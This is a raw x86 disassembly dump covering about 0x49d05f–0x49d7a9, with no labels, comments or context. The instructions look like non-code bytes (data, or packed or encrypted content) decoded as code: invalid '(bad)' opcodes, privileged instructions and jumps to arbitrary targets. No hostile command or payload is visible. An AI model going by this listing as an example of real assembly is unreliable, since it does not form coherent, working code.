  49d05f:	mov    eax,0xc51a2084
  49d064:	jo     0x49d0cb
  49d066:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49d067:	addr16 sub eax,0x3f222e1a
  49d06d:	cmp    DWORD PTR [edi+0x3d4aa40f],edi
  49d073:	(bad)  
  49d074:	shl    DWORD PTR [edx+0x8],cl
  49d077:	cdq    
  49d078:	nop
  49d079:	xchg   ecx,eax
  49d07a:	aaa    
  49d07b:	ss xor ch,al
  49d07e:	sar    BYTE PTR [edx],0x5e
  49d081:	pop    es
  49d082:	pop    ds
  49d083:	jae    0x49d084
  49d085:	sbb    dl,BYTE PTR [ecx+0x107f17ad]
  49d08b:	inc    esi
  49d08c:	pop    esi
  49d08d:	lods   al,BYTE PTR ds:[esi]
  49d08e:	mov    al,ds:0xffffc284
  49d093:	call   FWORD PTR [edi-0x5a7776b3]
  49d099:	mov    esp,DWORD PTR [ebx+0x4a06834f]
  49d09f:	adc    ah,BYTE PTR [eax-0x68fe4d0e]
  49d0a5:	inc    edi
  49d0a6:	mov    bl,0x79
  49d0a8:	xor    edi,ebp
  49d0aa:	xchg   ebp,eax
  49d0ab:	push   ecx
  49d0ac:	loop   0x49d0b6
  49d0ae:	jmp    FWORD PTR [edi]
  49d0b0:	or     al,BYTE PTR [eax]
  49d0b2:	ffreep st(0)
  49d0b4:	xor    eax,0x230342f4
  49d0b9:	or     eax,0x3491a147
  49d0be:	mov    al,0x28
  49d0c0:	(bad)  
  49d0c1:	aad    0x5a
  49d0c3:	aam    0xc
  49d0c5:	aam    0x88
  49d0c7:	cmp    ah,BYTE PTR [edi]
  49d0c9:	(bad)  
  49d0ca:	(bad)  
  49d0cb:	fst    QWORD PTR [ecx]
  49d0cd:	xor    al,0xaf
  49d0cf:	cs cmp eax,0xa0fafcfb
  49d0d5:	push   0x838a710
  49d0da:	add    BYTE PTR [ebx],ch
  49d0dc:	xor    esi,DWORD PTR [ecx-0x4b]
  49d0df:	loop   0x49d0f7
  49d0e1:	mov    edi,0x16471458
  49d0e6:	popaw  
  49d0e8:	arpl   WORD PTR [ebp+0x27],sp
  49d0eb:	sub    edi,ecx
  49d0ed:	xor    al,0xf9
  49d0ef:	outs   dx,DWORD PTR ds:[esi]
  49d0f0:	je     0x49d15a
  49d0f2:	gs jb  0x49d0b0
  49d0f5:	xor    ecx,DWORD PTR [eax]
  49d0f7:	xor    eax,0xf7c712a8
  49d0fc:	adc    al,0x23
  49d0fe:	(bad)  
  49d0ff:	mov    ah,0xbb
  49d101:	cmp    ecx,DWORD PTR [edx+0x15]
  49d104:	loop   0x49d131
  49d106:	xchg   ebx,eax
  49d107:	stos   DWORD PTR es:[edi],eax
  49d108:	add    eax,0xabab1546
  49d10d:	and    DWORD PTR [ebx],0x46
  49d110:	in     al,0x4a
  49d112:	sbb    dl,BYTE PTR [esi]
  49d114:	mov    ah,0x20
  49d116:	lods   al,BYTE PTR ds:[esi]
  49d117:	scas   al,BYTE PTR es:[edi]
  49d118:	jmp    0x49d0bd
  49d11a:	xor    edi,esp
  49d11c:	add    DWORD PTR [ebx-0x6024aa9d],ebp
  49d122:	and    al,0x13
  49d124:	jo     0x49d106
  49d126:	dec    edi
  49d127:	mov    edi,0x86ad3733
  49d12c:	sub    eax,0x77c75b8f
  49d131:	lock in eax,0x91
  49d134:	mov    bl,0x72
  49d136:	(bad)  
  49d138:	bound  ebp,QWORD PTR fs:[ebx+0x72]
  49d13c:	jo     0x49d1b1
  49d13e:	bound  ecx,QWORD PTR [edx]
  49d140:	push   es
  49d141:	in     al,0xa3
  49d143:	dec    edi
  49d144:	cld    
  49d145:	aaa    
  49d146:	mov    bl,0x11
  49d148:	or     eax,0x339f2c31
  49d14d:	fwait
  49d14e:	daa    
  49d14f:	inc    esi
  49d150:	push   eax
  49d151:	push   0xf
  49d153:	aas    
  49d154:	pusha  
  49d155:	adc    BYTE PTR ds:0x8883cb16,dl
  49d15b:	mov    al,0x46
  49d15d:	iret   
  49d15e:	adc    esp,DWORD PTR [eax+0xa]
  49d161:	test   al,0x1d
  49d163:	push   edi
  49d164:	aas    
  49d165:	bound  ebx,QWORD PTR [ecx-0x7f71377]
  49d16b:	pop    ss
  49d16c:	push   esi
  49d16d:	or     ebp,DWORD PTR [ecx+esi*4+0x6e49763f]
  49d174:	imul   esi,DWORD PTR [edi+ebx*1+0x67],0x4fcbd369
  49d17c:	push   esi
  49d17d:	outs   dx,BYTE PTR ds:[esi]
  49d17e:	popa   
  49d17f:	ins    DWORD PTR es:[edi],dx
  49d180:	jbe    0x49d1f4
  49d182:	dec    edi
  49d183:	mov    ah,0x51
  49d185:	lds    esi,FWORD PTR [ecx]
  49d187:	xor    DWORD PTR [ebx+edx*4],0x7
  49d18b:	leave  
  49d18c:	outs   dx,DWORD PTR ds:[esi]
  49d18d:	mov    ebp,0xaf0b4fa7
  49d192:	cmp    DWORD PTR [ebx+edx*1],ecx
  49d195:	pop    ebp
  49d196:	pop    eax
  49d197:	sti    
  49d198:	xor    BYTE PTR [edi+0x56f0c558],dl
  49d19e:	daa    
  49d19f:	xchg   edi,eax
  49d1a0:	test   al,0x50
  49d1a2:	xchg   esp,eax
  49d1a3:	push   0x77
  49d1a5:	xchg   ebx,eax
  49d1a6:	xor    bl,dh
  49d1a8:	(bad)  
  49d1a9:	sub    al,bh
  49d1ab:	rol    BYTE PTR [eax+0x5fbc3857],1
  49d1b1:	xor    al,0x6a
  49d1b3:	xchg   edi,eax
  49d1b4:	jo     0x49d1c5
  49d1b6:	inc    ebp
  49d1b8:	jne    0x49d1c4
  49d1ba:	(bad)  
  49d1bc:	dec    esp
  49d1bd:	popa   
  49d1be:	bound  esp,QWORD PTR [ebp+0x6c]
  49d1c1:	xor    DWORD PTR [edx],esi
  49d1c3:	jg     0x49d210
  49d1c5:	stos   DWORD PTR es:[edi],eax
  49d1c6:	mov    al,BYTE PTR [ebp+0x7f]
  49d1c9:	repz sub edx,eax
  49d1cc:	push   esp
  49d1cd:	lods   eax,DWORD PTR ds:[esi]
  49d1ce:	sbb    DWORD PTR [edi],0x33
  49d1d1:	sqrtps xmm4,XMMWORD PTR [eax+ebp*2+0x3b2fab05]
  49d1d9:	and    DWORD PTR [edx+0x2f632231],ebp
  49d1df:	adc    eax,0x93013631
  49d1e4:	dec    edi
  49d1e5:	fld    TBYTE PTR [ecx-0x60c47569]
  49d1eb:	dec    edi
  49d1ec:	aas    
  49d1ed:	nop
  49d1ee:	sub    dh,BYTE PTR [ecx-0x28380896]
  49d1f4:	loope  0x49d23c
  49d1f6:	mov    eax,ds:0x4eef01eb
  49d1fb:	int3   
  49d1fc:	and    BYTE PTR [edx],bh
  49d1fe:	leave  
  49d1ff:	gs js  0x49d243
  49d202:	fs es push edi
  49d205:	xor    DWORD PTR [ecx-0x68c42656],edx
  49d20b:	ins    DWORD PTR es:[edi],dx
  49d20c:	popa   
  49d20d:	outs   dx,BYTE PTR ds:[esi]
  49d20e:	jne    0x49d22f
  49d210:	xor    al,0x7f
  49d212:	mov    ecx,DWORD PTR [edx]
  49d214:	and    al,dl
  49d216:	inc    ebx
  49d217:	lahf   
  49d218:	(bad)  
  49d219:	sub    DWORD PTR [edx+edx*4+0x523a0b31],esp
  49d220:	ret    
  49d221:	and    edi,eax
  49d223:	outs   dx,DWORD PTR ds:[esi]
  49d224:	dec    ebx
  49d225:	pop    eax
  49d226:	daa    
  49d227:	mov    ds,edx
  49d229:	jg     0x49d25f
  49d22b:	out    0xba,eax
  49d22d:	xor    eax,0x34c76239
  49d232:	mov    edi,0xc0e2e183
  49d237:	jecxz  0x49d26d
  49d239:	ja     0x49d283
  49d23b:	and    DWORD PTR [edx+0x42],edi
  49d23e:	cs bswap ebx
  49d241:	lock mov ah,0x33
  49d244:	mov    eax,0x69443722
  49d249:	jbe    0x49d2ba
  49d24b:	lock lea edx,es:[ebx]
  49d24f:	xor    ecx,DWORD PTR [edi]
  49d251:	aaa    
  49d252:	lahf   
  49d253:	iret   
  49d254:	dec    eax
  49d255:	xor    edx,DWORD PTR [ebp-0x48]
  49d258:	xor    edx,edi
  49d25a:	xor    dh,BYTE PTR [edx]
  49d25c:	or     bl,BYTE PTR [esp+eax*8]
  49d25f:	add    al,0x34
  49d261:	retf   
  49d262:	adc    eax,0x13ad4c58
  49d267:	xchg   edi,esp
  49d269:	mov    eax,0xab484c41
  49d26e:	sub    BYTE PTR es:[esi-0x4b],al
  49d272:	bound  esp,QWORD PTR [edi+0x2d690753]
  49d278:	scas   al,BYTE PTR es:[edi]
  49d279:	or     esi,DWORD PTR [eax]
  49d27b:	mov    bl,0xea
  49d27d:	dec    ebp
  49d27e:	sti    
  49d27f:	push   edi
  49d280:	aaa    
  49d281:	push   ebp
  49d282:	outs   dx,BYTE PTR ds:[esi]
  49d283:	ins    BYTE PTR es:[edi],dx
  49d284:	outs   dx,DWORD PTR ds:[esi]
  49d285:	arpl   WORD PTR [ebx+0x1f],bp
  49d288:	dec    esp
  49d289:	sbb    ebx,DWORD PTR [ebx-0x5c]
  49d28c:	add    esp,DWORD PTR [esi+edi*2-0x6140ff25]
  49d293:	push   0x15
  49d295:	shr    DWORD PTR [edx+0x31af0f],0xb
  49d29c:	mov    al,0x17
  49d29e:	sti    
  49d29f:	aaa    
  49d2a0:	pop    eax
  49d2a1:	xchg   ebp,eax
  49d2a2:	ss push 0x226bdb6f
  49d2a8:	mov    dh,0xd5
  49d2aa:	ja     0x49d23f
  49d2ac:	sub    edx,DWORD PTR [esi+0x8]
  49d2af:	lods   al,BYTE PTR ds:[esi]
  49d2b0:	push   edx
  49d2b1:	repz addr16 inc ebx
  49d2b4:	pop    ebx
  49d2b5:	(bad)
  49d2b8:	ss out 0x2f,eax
  49d2bb:	xor    ebx,ecx
  49d2bd:	jbe    0x49d321
  49d2bf:	and    edi,ebx
  49d2c1:	xchg   DWORD PTR [edi+0x36],ebx
  49d2c4:	ss popa 
  49d2c6:	pop    ebx
  49d2c7:	das    
  49d2c8:	adc    ebx,esi
  49d2ca:	push   0x54276bfc
  49d2cf:	outs   dx,DWORD PTR ds:[esi]
  49d2d0:	inc    ecx
  49d2d1:	outs   dx,BYTE PTR ds:[esi]
  49d2d2:	jae    0x49d33d
  49d2d4:	jmp    FWORD PTR [ecx+0x78]
  49d2d7:	mov    eax,ds:0x9c90e014
  49d2dc:	add    eax,0x69f6d25c
  49d2e1:	dec    edi
  49d2e2:	gs je  0x49d338
  49d2e5:	jns    0x49d30d
  49d2e7:	gs ins DWORD PTR es:[edi],dx
  49d2e9:	adc    eax,0xa0694eb0
  49d2ee:	mov    dh,0x3
  49d2f0:	adc    BYTE PTR [ebx-0x34deee],cl
  49d2f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49d2f7:	les    edx,FWORD PTR [eax-0x681834de]
  49d2fd:	in     eax,dx
  49d2fe:	sbb    dl,BYTE PTR [esi]
  49d300:	mov    esp,0x37cf3f77
  49d305:	dec    edi
  49d306:	fild   DWORD PTR [ecx-0x74cba36b]
  49d30c:	cmovo  ebp,DWORD PTR [edx]
  49d30f:	mov    dh,0x2d
  49d311:	outs   dx,DWORD PTR ds:[esi]
  49d312:	pop    ds
  49d313:	inc    edi
  49d314:	add    eax,0x5f038365
  49d319:	pop    edi
  49d31a:	sub    BYTE PTR [esi-0x3b],ch
  49d31d:	fisttp DWORD PTR [edi+0x1f]
  49d320:	outs   dx,DWORD PTR ds:[esi]
  49d321:	ret    0x2dbf
  49d324:	xchg   BYTE PTR ds:0x30873f0b,dl
  49d32a:	push   esp
  49d32b:	rcl    BYTE PTR [edi],cl
  49d32d:	sbb    ch,BYTE PTR [ecx+0x63]
  49d330:	outs   dx,DWORD PTR ds:[esi]
  49d331:	fs gs das 
  49d334:	jae    0x49d2d5
  49d336:	pop    ds
  49d337:	nop
  49d338:	shl    DWORD PTR [eax-0x69],0x27
  49d33c:	xor    al,BYTE PTR [eax]
  49d33e:	arpl   WORD PTR [edx+0x5],si
  49d341:	push   ss
  49d342:	lds    eax,FWORD PTR [ebp+0x7]
  49d345:	aaa    
  49d346:	addr16 out dx,eax
  49d348:	add    DWORD PTR ds:0x6fa758a9,0xfffffff6
  49d34f:	aaa    
  49d350:	(bad)  
  49d351:	ficom  WORD PTR [edx+0x477f3b34]
  49d357:	dec    esp
  49d358:	xor    BYTE PTR [ecx],dl
  49d35a:	outs   dx,DWORD PTR ds:[esi]
  49d35b:	adc    ebp,DWORD PTR [ebx]
  49d35d:	cmp    BYTE PTR [ebp-0x50ca924b],cl
  49d363:	outs   dx,DWORD PTR ds:[esi]
  49d364:	(bad)
  49d368:	fcom   DWORD PTR [edi]
  49d36a:	ja     0x49d36a
  49d36c:	inc    ebx
  49d36d:	adc    eax,0x5b85edbd
  49d372:	add    esi,edi
  49d374:	ja     0x49d3e0
  49d376:	jp     0x49d3c3
  49d378:	mov    edx,0x2f5b39af
  49d37d:	jae    0x49d399
  49d37f:	imul   eax,eax,0x1f
  49d382:	mov    BYTE PTR [edi],dl
  49d384:	call   0x4e67:0x41bf8db
  49d38b:	outs   dx,DWORD PTR ds:[esi]
  49d38c:	data16 adc BYTE PTR [edi],bh
  49d38f:	xchg   BYTE PTR [eax+eax*8+0x63],dh
  49d393:	pop    eax
  49d394:	out    0x17,al
  49d396:	xor    ecx,DWORD PTR [ebp-0x45]
  49d399:	(bad)  
  49d39a:	cs mov bl,0xfb
  49d39d:	mov    ebx,ebx
  49d39f:	adc    eax,0x2f1bc22d
  49d3a4:	jmp    0x49d3f9
  49d3a6:	cwde   
  49d3a7:	xor    DWORD PTR [edx],edi
  49d3a9:	mov    dh,0x3f
  49d3ab:	sti    
  49d3ac:	jae    0x49d41f
  49d3ae:	ins    BYTE PTR es:[edi],dx
  49d3af:	fcmovnu st,st(6)
  49d3b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49d3b2:	xchg   DWORD PTR [edi],edi
  49d3b4:	daa    
  49d3b5:	cmp    al,cl
  49d3b7:	adc    al,0x63
  49d3b9:	xlat   BYTE PTR ds:[ebx]
  49d3ba:	sti    
  49d3bb:	(bad)  ss:[ebx+0x7a6b1f37]
  49d3c2:	pop    eax
  49d3c3:	jae    0x49d3e0
  49d3c5:	fwait
  49d3c6:	popa   
  49d3c7:	and    al,0x17
  49d3c9:	or     al,0xc3
  49d3cb:	xor    al,0xee
  49d3cd:	xchg   BYTE PTR [ebp-0x14],ch
  49d3d0:	arpl   di,sp
  49d3d2:	xchg   edi,eax
  49d3d3:	jg     0x49d39d
  49d3d5:	push   es
  49d3d6:	and    BYTE PTR [ebp+0x343bba65],dh
  49d3dc:	scas   eax,DWORD PTR es:[edi]
  49d3dd:	inc    edi
  49d3de:	pop    ebx
  49d3df:	pop    ebx
  49d3e0:	in     eax,dx
  49d3e1:	xchg   edi,eax
  49d3e2:	scas   eax,DWORD PTR es:[edi]
  49d3e3:	lahf   
  49d3e4:	pop    ds
  49d3e5:	xor    esp,DWORD PTR [esi+esi*4]
  49d3e8:	push   ecx
  49d3e9:	dec    ebp
  49d3ea:	mov    ecx,DWORD PTR [edi]
  49d3ec:	cmp    cl,BYTE PTR [ebp-0x10441569]
  49d3f2:	addr16 mov ch,0xcd
  49d3f5:	rcr    DWORD PTR [eax],0x3f
  49d3f8:	xchg   edi,eax
  49d3f9:	push   es
  49d3fa:	dec    esp
  49d3fc:	mov    dh,0x1c
  49d3fe:	sub    eax,0xa10e2d22
  49d403:	add    DWORD PTR [ebp+edx*8+0x2e],esi
  49d407:	push   cs
  49d408:	mov    eax,ds:0xd20f0100
  49d40d:	shl    BYTE PTR [edi],0xaa
  49d410:	rcr    bl,cl
  49d412:	mov    eax,0xbfdf780a
  49d417:	or     cl,BYTE PTR [edi+0xd]
  49d41a:	add    DWORD PTR [ecx],edx
  49d41c:	add    BYTE PTR [eax],ah
  49d41e:	and    BYTE PTR [edx],bl
  49d420:	and    BYTE PTR [ecx+0x1c],cl
  49d423:	jb     0x49d495
  49d425:	int3   
  49d426:	popa   
  49d427:	sbb    ebp,DWORD PTR [ebx]
  49d429:	sbb    eax,esp
  49d42b:	mov    ds:0x142f780d,al
  49d430:	and    al,BYTE PTR [ecx]
  49d432:	and    eax,DWORD PTR [esi+0x7e2c6c5e]
  49d438:	bound  ecx,QWORD PTR [ebx]
  49d43a:	adc    eax,0x960b7ea
  49d43f:	xor    BYTE PTR [eax],0x10
  49d442:	push   cs
  49d443:	add    al,0x0
  49d445:	push   0xd9b29646
  49d44a:	pushf  
  49d44b:	fldenv [esi]
  49d44d:	jbe    0x49d46e
  49d44f:	call   0x1050d256
  49d454:	adc    ah,bh
  49d456:	jns    0x49d4ce
  49d458:	xor    al,0x28
  49d45a:	fs out 0x5c,al
  49d45d:	pop    esi
  49d45e:	add    BYTE PTR [eax],cl
  49d460:	add    BYTE PTR [eax+0x4ddb290e],ch
  49d466:	(bad)  [esi]
  49d468:	or     ebx,DWORD PTR [edi]
  49d46a:	or     BYTE PTR [esi-0x4a],bl
  49d46d:	sbb    ebx,edx
  49d46f:	or     al,0xb2
  49d471:	popf   
  49d472:	pop    ds
  49d473:	push   0x225e5e05
  49d478:	and    BYTE PTR ds:0x6419a6c8,ah
  49d47e:	(bad)  
  49d47f:	daa    
  49d480:	and    BYTE PTR [eax],dl
  49d482:	outs   dx,BYTE PTR ds:[esi]
  49d483:	dec    ebp
  49d484:	ja     0x49d43c
  49d486:	dec    ebp
  49d487:	xor    esp,DWORD PTR [eax]
  49d489:	add    al,0x16
  49d48b:	pop    esi
  49d48c:	data16 sub BYTE PTR [eax],al
  49d48f:	push   es
  49d490:	gs inc edi
  49d492:	ret    0x609d
  49d495:	out    dx,al
  49d496:	sbb    eax,0x96d22e0d
  49d49b:	stos   DWORD PTR es:[edi],eax
  49d49c:	add    eax,0x3800c80
  49d4a1:	imul   ebp,edi,0x82573d9
  49d4a7:	rol    BYTE PTR [eax],0x22
  49d4aa:	inc    DWORD PTR ds:0xd821ff0c
  49d4b0:	cmp    DWORD PTR [edi],edx
  49d4b2:	add    esp,DWORD PTR ds:0xde420108
  49d4b8:	cmp    al,0xb4
  49d4ba:	jo     0x49d4e7
  49d4bc:	pop    es
  49d4bd:	mov    BYTE PTR [edi+0x77],dh
  49d4c0:	mov    BYTE PTR [edi+0x76bedd70],al
  49d4c6:	dec    DWORD PTR [eax+0x7778778]
  49d4cc:	(bad)
  49d4d0:	js     0x49d54a
  49d4d2:	push   eax
  49d4d3:	mov    bh,0xb8
  49d4d5:	je     0x49d484
  49d4d7:	mov    ebp,0xf83abdad
  49d4dc:	xchg   DWORD PTR [eax+0x77],edi
  49d4df:	sub    eax,0x3333b74c
  49d4e4:	jno    0x49d550
  49d4e6:	call   DWORD PTR [edx]
  49d4e8:	ja     0x49d567
  49d4ea:	push   edi
  49d4eb:	jl     0x49d560
  49d4ed:	lahf   
  49d4ee:	das    
  49d4ef:	xchg   DWORD PTR [ebx+0x3b],esi
  49d4f2:	jp     0x49d508
  49d4f4:	adc    BYTE PTR [edi+0x2b],ah
  49d4f7:	ja     0x49d4aa
  49d4f9:	sti    
  49d4fa:	xchg   BYTE PTR [edi+0x17707893],ah
  49d500:	adc    al,0x77
  49d502:	jg     0x49d48c
  49d504:	jae    0x49d50d
  49d506:	mov    esi,0x99af6031
  49d50b:	std    
  49d50c:	or     BYTE PTR [edi+0x70],dh
  49d50f:	pusha  
  49d510:	pop    es
  49d511:	push   eax
  49d512:	push   edx
  49d513:	sbb    al,0x4
  49d515:	popa   
  49d516:	add    ch,ah
  49d518:	fldcw  WORD PTR [edi+0x5f]
  49d51b:	pop    ss
  49d51c:	jo     0x49d575
  49d51e:	xchg   esi,ebp
  49d520:	xor    BYTE PTR [eax],ah
  49d522:	pop    es
  49d523:	pop    es
  49d524:	add    BYTE PTR [edi],ah
  49d526:	cmp    al,0x60
  49d528:	js     0x49d59e
  49d52a:	neg    BYTE PTR [edi]
  49d52c:	fmul   DWORD PTR [eax]
  49d52e:	push   ss
  49d52f:	ins    BYTE PTR es:[edi],dx
  49d530:	jo     0x49d579
  49d532:	push   edi
  49d533:	push   edx
  49d534:	push   edx
  49d535:	push   edi
  49d536:	add    esp,eax
  49d538:	popa   
  49d539:	and    BYTE PTR [ebp-0x11],0xff
  49d53d:	mov    dh,0x58
  49d53f:	ja     0x49d562
  49d541:	popa   
  49d542:	addr16 ss ss aaa 
  49d546:	push   edi
  49d547:	and    eax,0xc1317776
  49d54c:	shr    esp,0xfd
  49d54f:	popf   
  49d550:	mov    eax,0x56575701
  49d555:	aaa    
  49d556:	jb     0x49d5cf
  49d558:	push   ss
  49d559:	rol    BYTE PTR [edi-0x42027fd1],1
  49d55f:	fistp  WORD PTR [ebp-0x49]
  49d562:	jne    0x49d59b
  49d564:	aaa    
  49d565:	jne    0x49d56d
  49d567:	pusha  
  49d568:	das    
  49d569:	or     BYTE PTR [eax-0x6d],dh
  49d56c:	mov    ch,0x83
  49d56e:	frstor [ebp-0x74d023ff]
  49d574:	and    bl,0x78
  49d577:	js     0x49d5b6
  49d579:	sbb    DWORD PTR [ebp-0x1c],0x30
  49d57d:	xchg   DWORD PTR ds:0x7a2570b8,esp
  49d583:	xchg   DWORD PTR [edi-0x5],esp
  49d586:	lods   al,BYTE PTR ds:[esi]
  49d587:	fld    DWORD PTR [esi+eax*1]
  49d58a:	cmp    al,BYTE PTR [edi+0x77b7885d]
  49d590:	mov    eax,DWORD PTR [eax]
  49d592:	xchg   DWORD PTR [eax+0xef77ef7],ecx
  49d598:	dec    esi
  49d599:	mov    esp,0xb82c2e8f
  49d59e:	jae    0x49d61b
  49d5a0:	pop    eax
  49d5a1:	mov    eax,0x1799be30
  49d5a6:	jbe    0x49d53e
  49d5a8:	sub    BYTE PTR [eax+0x78208788],cl
  49d5ae:	mov    ch,0x37
  49d5b0:	jnp    0x49d53d
  49d5b2:	sti    
  49d5b3:	addr16 iret 
  49d5b5:	out    dx,al
  49d5b6:	cmp    al,0x86
  49d5b8:	pushf  
  49d5b9:	sub    bh,al
  49d5bb:	add    ch,BYTE PTR [esi]
  49d5bd:	jnp    0x49d546
  49d5bf:	mov    eax,0xfe287983
  49d5c4:	fiadd  WORD PTR [ebx+0x33]
  49d5c7:	add    dh,BYTE PTR [eax+edi*8]
  49d5ca:	cmp    bh,0x31
  49d5cd:	pop    edi
  49d5ce:	mov    edi,DWORD PTR [ecx+0x73]
  49d5d1:	aaa    
  49d5d2:	out    dx,eax
  49d5d3:	mov    ebp,0x608706d7
  49d5d8:	neg    DWORD PTR [edx]
  49d5da:	(bad)  
  49d5db:	pop    edi
  49d5dc:	sar    BYTE PTR [eax-0x7a84887d],0x3b
  49d5e3:	shl    BYTE PTR [esi+0x61],cl
  49d5e6:	mov    BYTE PTR [ebx+0x70ff875e],cl
  49d5ec:	out    dx,eax
  49d5ed:	push   esp
  49d5ee:	sbb    cl,0xa1
  49d5f1:	cmp    DWORD PTR [ebx-0x40dd7762],ecx
  49d5f7:	(bad)  
  49d5f8:	jle    0x49d595
  49d5fa:	lods   eax,DWORD PTR ds:[esi]
  49d5fb:	out    dx,al
  49d5fc:	jge    0x49d57e
  49d5fe:	jns    0x49d677
  49d600:	push   0x2d164078
  49d605:	(bad)  
  49d606:	lock xor edi,eax
  49d609:	out    dx,al
  49d60a:	jl     0x49d5c4
  49d60c:	mov    eax,0xe73838b
  49d611:	pop    esi
  49d612:	add    BYTE PTR [edi-0x1f22f7b1],cl
  49d618:	ss xor edx,esp
  49d61b:	stos   BYTE PTR es:[edi],al
  49d61c:	add    dh,BYTE PTR [edi+0x38]
  49d61f:	mov    eax,0x2dc32e84
  49d624:	mov    eax,0x1f828ee
  49d629:	cmp    BYTE PTR [eax+eiz*8-0x69],0x7b
  49d62e:	cmp    cl,BYTE PTR [esi-0x45]
  49d631:	pop    ebp
  49d632:	cmp    edi,DWORD PTR [ebx-0x6dfda170]
  49d638:	jo     0x49d65b
  49d63a:	cmp    DWORD PTR [ebx+0x58],0xffffffec
  49d63e:	aaa    
  49d63f:	cmp    BYTE PTR [ebx-0xf7a144],bh
  49d645:	fsub   QWORD PTR [eax]
  49d647:	push   eax
  49d648:	or     bl,bl
  49d64a:	pop    ebp
  49d64b:	ja     0x49d6ae
  49d64d:	cmp    al,0x47
  49d64f:	jmp    0x49d5e0
  49d651:	inc    esp
  49d652:	and    DWORD PTR [ecx+0x52ed0873],ecx
  49d658:	or     al,0xde
  49d65a:	mov    BYTE PTR [edi-0x4e],bl
  49d65d:	mov    bh,0x21
  49d65f:	add    DWORD PTR [ebx-0x212d17d9],0xffffffca
  49d666:	pop    edi
  49d667:	add    DWORD PTR [ebx+0x39fd1eb7],esi
  49d66d:	add    DWORD PTR [esi+0x2c5f2b35],esi
  49d673:	xor    DWORD PTR [edi],ebp
  49d675:	jbe    0x49d6ee
  49d677:	mov    DWORD PTR [edi],ebp
  49d679:	mov    ah,0xee
  49d67b:	pop    esp
  49d67c:	(bad)  
  49d67d:	mov    eax,0xf62e1cbf
  49d682:	pusha  
  49d683:	and    ch,BYTE PTR [edi+0x5f]
  49d686:	clc    
  49d687:	sbb    DWORD PTR fs:[esi-0x6ecfac68],esi
  49d68e:	pop    edi
  49d68f:	mov    edi,0x9de0a388
  49d694:	or     ebx,edi
  49d696:	enter  0x4f88,0x33
  49d69a:	mov    cl,0xe
  49d69c:	xchg   DWORD PTR [eax-0x40406490],ecx
  49d6a2:	mov    esp,esp
  49d6a4:	xor    esi,DWORD PTR [ebp-0x777c719]
  49d6aa:	pop    edi
  49d6ab:	mov    al,bh
  49d6ad:	mov    eax,0xd81b811
  49d6b2:	and    dl,BYTE PTR [eax-0x75]
  49d6b5:	fild   QWORD PTR [ebx-0x75]
  49d6b8:	ins    DWORD PTR es:[edi],dx
  49d6b9:	ja     0x49d6b3
  49d6bb:	pop    esp
  49d6bc:	add    edi,DWORD PTR [edi-0x27fc47ce]
  49d6c2:	xchg   DWORD PTR [edi+0x2c],ecx
  49d6c5:	mov    edi,0x8bbfbf8f
  49d6ca:	popf   
  49d6cb:	lock das 
  49d6cd:	das    
  49d6ce:	mov    cl,0xa3
  49d6d0:	fwait
  49d6d1:	mov    edi,0x2a01b182
  49d6d6:	(bad)  
  49d6d7:	xchg   edi,eax
  49d6d8:	fnstenv [edx-0x4b]
  49d6db:	add    BYTE PTR [ecx],al
  49d6dd:	dec    DWORD PTR [edi]
  49d6df:	jg     0x49d6c1
  49d6e1:	sar    BYTE PTR [edi+ecx*4],cl
  49d6e4:	retf   0x1ff0
  49d6e7:	dec    bl
  49d6e9:	push   cs
  49d6ea:	loopne 0x49d6ef
  49d6ec:	lock cmp al,0xc3
  49d6ef:	pushf  
  49d6f0:	mov    ds:0x1fc07f0f,eax
  49d6f5:	and    al,0x37
  49d6f7:	movaps xmm6,XMMWORD PTR [esi]
  49d6fa:	add    eax,0x391c070f
  49d6ff:	xor    cl,al
  49d701:	inc    DWORD PTR [eax-0xf063f03]
  49d707:	fbld   TBYTE PTR [ebp+0x47]
  49d70a:	mov    ?,ecx
  49d70c:	clc    
  49d70d:	loope  0x49d707
  49d70f:	(bad)  
  49d710:	cmp    al,0x9f
  49d712:	add    BYTE PTR [edx+esi*2],bl
  49d715:	repnz es push cs
  49d718:	and    al,dh
  49d71a:	pop    es
  49d71b:	in     al,0x72
  49d71d:	enter  0xf881,0x3
  49d721:	cld    
  49d722:	cmp    BYTE PTR [eax],bl
  49d724:	pop    ecx
  49d725:	cmp    DWORD PTR [ecx],eax
  49d727:	add    esi,edi
  49d729:	add    esp,DWORD PTR ds:0x3d9c8c91
  49d72f:	mov    ecx,DWORD PTR [edi]
  49d731:	sysret 
  49d733:	(bad)  
  49d734:	call   DWORD PTR [ecx+0x7072391]
  49d73a:	add    edi,edi
  49d73c:	push   DWORD PTR [edx-0x6e]
  49d73f:	out    0x3,al
  49d741:	into   
  49d742:	and    BYTE PTR [eax+0x0],al
  49d745:	add    dh,BYTE PTR [eax+0xd]
  49d748:	pop    eax
  49d749:	inc    eax
  49d74a:	pusha  
  49d74b:	pop    es
  49d74c:	push   es
  49d74d:	pop    es
  49d74e:	sub    BYTE PTR [eax+0x38],al
  49d751:	jns    0x49d785
  49d753:	popa   
  49d754:	imul   esp,DWORD PTR [eax+0x0],0xffffffc1
  49d758:	jg     0x49d775
  49d75a:	js     0x49d6eb
  49d75c:	sti    
  49d75d:	cmp    esi,DWORD PTR [ecx+0x6a]
  49d760:	neg    BYTE PTR [esi]
  49d762:	mov    al,0xc0
  49d764:	jae    0x49d791
  49d766:	mov    bl,0x10
  49d768:	add    esi,ecx
  49d76a:	aas    
  49d76b:	invd   
  49d76d:	jo     0x49d74a
  49d76f:	ds jo  0x49d782
  49d772:	inc    esp
  49d773:	mov    BYTE PTR [eax+ebp*1-0x22],dh
  49d777:	adc    DWORD PTR [ebp+0x1b],esi
  49d77a:	jne    0x49d75c
  49d77c:	xchg   DWORD PTR [esp+ebx*2],eax
  49d77f:	inc    edx
  49d780:	repz ja 0x49d7fb
  49d783:	test   eax,edi
  49d785:	fwait
  49d786:	pop    es
  49d787:	pop    esp
  49d788:	mov    edi,0x1406740e
  49d78d:	xor    al,0x30
  49d78f:	or     BYTE PTR [ecx+eiz*1],ch
  49d792:	dec    esp
  49d793:	and    BYTE PTR [edi],dh
  49d795:	cs jo  0x49d793
  49d798:	(bad)  
  49d799:	jno    0x49d812
  49d79b:	jno    0x49d804
  49d79d:	push   edx
  49d79e:	js     0x49d798
  49d7a0:	pop    ds
  49d7a1:	or     BYTE PTR [eax-0x4f8988aa],dl
  49d7a7:	jg     0x49d801
  49d7a9:	sub    BYTE PTR [eax+0x870f507],dh
